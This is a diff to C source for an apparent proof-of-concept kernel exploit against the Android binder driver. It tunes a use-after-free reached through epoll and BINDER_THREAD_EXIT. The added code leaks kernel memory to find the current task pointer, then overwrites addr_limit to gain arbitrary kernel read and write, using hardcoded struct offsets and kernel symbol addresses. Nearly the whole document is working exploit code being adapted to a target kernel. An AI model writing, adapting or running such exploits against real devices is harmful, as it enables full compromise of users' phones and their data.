@@ -9,6 +9,7 @@
 */
 
 #define _GNU_SOURCE
+#include <time.h>
 #include <stdbool.h>
 #include <sys/mman.h>
 #include <sys/wait.h>
@@ -31,17 +32,20 @@
 
 #define LEAK_AMOUNT 4096
 
+#define OFFSET__task_struct__mm 0x520
 #define MIN(x,y) ((x)<(y) ? (x) : (y))
 #define MAX(x,y) ((x)>(y) ? (x) : (y))
 
 #define BINDER_THREAD_EXIT 0x40046208ul
 // NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
-#define BINDER_THREAD_SZ 0x190
+#define BINDER_THREAD_SZ 0x188
 #define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
 #define WAITQUEUE_OFFSET (0x98)
 #define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
 #define UAF_SPINLOCK 0x10001
 #define PAGE 0x1000
+
+unsigned long kernel_read_ulong(unsigned long kaddr);
 
 void hexdump_memory(unsigned char *buf, size_t byte_count) {
   unsigned long byte_offset_start = 0;
@@ -108,7 +112,7 @@ void leak_data(void* leakBuffer, int leakAmount)
   if (fork_ret == 0){
     /* Child process */
     prctl(PR_SET_PDEATHSIG, SIGKILL);
-    sleep(2);
+    sleep(1);
     printf("CHILD: Doing EPOLL_CTL_DEL.\n");
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
@@ -136,48 +140,77 @@ void leak_data(void* leakBuffer, int leakAmount)
 
   int status;
   if (wait(&status) != fork_ret) err(1, "wait");
+
+  free(dataBuffer);
+
   printf("PARENT: Done with leaking\n");
 }
 
 void clobber_addr_limit(void)
 {
+  int dataBufferSize = MAX(UAF_SPINLOCK, PAGE);
+  char* dataBuffer = malloc(dataBufferSize); // TODO: free me!
+  if (dataBuffer == NULL) err(1, "allocating dataBuffer");
+  memset(dataBuffer, 1, dataBufferSize);
+  
+  char* uafFill = malloc(UAF_SPINLOCK);
+  if (uafFill == NULL) err(1, "allocating uafFill");
+  memset(uafFill, 0xC4, UAF_SPINLOCK);
+    
   struct epoll_event event = { .events = EPOLLIN };
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
 
+  unsigned long testDatum = 12;
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
   memset(iovec_array, 0, sizeof(iovec_array));
-
+  
   unsigned long second_write_chunk[] = {
-    1, /* iov_len */
-    0xdeadbeef, /* iov_base (already used) */
-    0x8 + 2 * 0x10, /* iov_len (already used) */
-    current_ptr + 0x8, /* next iov_base (addr_limit) */
+    (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
+    2 * 0x10, /* iov_len (currently in use) */  // wq->task_list->prev
+    &testDatum, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
-    0xfffffffffffffffe /* value to write */
+  };
+  
+  unsigned long third_write_chunk[] = {
+    0xfffffffffffffffe /* value to write over addr_limit */
   };
 
-  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
-  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
-  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
-  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* iov_len of previous, then this element and next element */
-  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
-  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */
-
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = UAF_SPINLOCK; // spinlock
+  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = dataBuffer; // wq->task_list->next
+  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev
+  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = &testDatum; // dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
+  int totalLength = iovec_array[IOVEC_INDX_FOR_WQ].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len;
+ 
   int socks[2];
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
-  if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte");
 
   pid_t fork_ret = fork();
   if (fork_ret == -1) err(1, "fork");
   if (fork_ret == 0){
     /* Child process */
     prctl(PR_SET_PDEATHSIG, SIGKILL);
-    sleep(2);
+    sleep(1);
     printf("CHILD: Doing EPOLL_CTL_DEL.\n");
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
+    
+    printf("CHILD: Writing UAF dummy\n");
+    if (write(socks[1], uafFill, UAF_SPINLOCK) != UAF_SPINLOCK)
+      err(1, "write dummy data");
+      
+    printf("CHILD: Writing second chunk\n");
     if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
       err(1, "write second chunk to socket");
+  
+    printf("CHILD: Writing third chunk\n");
+    if (write(socks[1], third_write_chunk, sizeof(third_write_chunk)) != sizeof(third_write_chunk))
+      err(1, "write third chunk to socket");
+  
+    printf("CHILD: done\n");
+    close(socks[1]);
+    //close(socks[0]);
     exit(0);
   }
   ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
@@ -186,10 +219,23 @@ void clobber_addr_limit(void)
     .msg_iovlen = IOVEC_ARRAY_SZ
   };
   int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
-  printf("recvmsg() returns %d, expected %lu\n", recvmsg_result,
-      (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
-      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
-      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
+/*  struct mmsghdr mmsg;
+  mmsg.msg_hdr.msg_iov = iovec_array;
+  mmsg.msg_hdr.msg_iovlen = IOVEC_ARRAY_SZ;
+  mmsg.msg_len = totalLength;
+    struct timespec timeout;
+    timeout.tv_sec = 10;
+    timeout.tv_nsec = 0;
+    int recvmsg_result = recvmmsg(socks[0], &mmsg, 1, MSG_WAITALL, &timeout);  */
+
+    printf("PARENT: testDatum = %lx\n", testDatum);
+    hexdump_memory(dataBuffer, 32);
+  
+  printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
+      totalLength);
+  sleep(2);
+  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
+  printf("current->mm == 0x%lx\n", current_mm);
 }
 
 int kernel_rw_pipe[2];
@@ -228,7 +274,7 @@ void kernel_write_uint(unsigned long kaddr, unsigned int data) {
 #define SYMBOL__init_task 0x20257d0
 #define SYMBOL__init_uts_ns 0x20255c0
 
-int main(void) {
+int main(int argc, char** argv) {
   printf("Starting POC\n");
   //pin_to(0);
 
@@ -239,9 +285,22 @@ int main(void) {
 
   binder_fd = open("/dev/binder", O_RDONLY);
   epfd = epoll_create(1000);
-  unsigned char leaked[4096];
-  leak_data(leaked, 4096);
-  hexdump_memory(leaked, 4096);
+  int leakSize = argc < 2 ? 4096 : atoi(argv[1]);
+  printf("Leak size %d\n", leakSize);
+  unsigned char* leaked = malloc(leakSize);
+  if (leaked == NULL) err(1, "Allocating leak buffer");
+  leak_data(leaked, leakSize);
+  hexdump_memory(leaked, leakSize);
+  if (leakSize >= 8) {
+      printf("tasklist = %lx\n", *(unsigned long *)leaked);
+  }
+  if (leakSize >= 0xe8 + 0x8) {
+      memcpy(&current_ptr, leaked+0xe8, 8);
+      printf("current_ptr = %lx\n", (unsigned long)current_ptr);
+//      printf("Clobbering addr_limit\n");
+//      clobber_addr_limit();
+  }
+  free(leaked);
   
 #if 0 // TODO
   clobber_addr_limit();
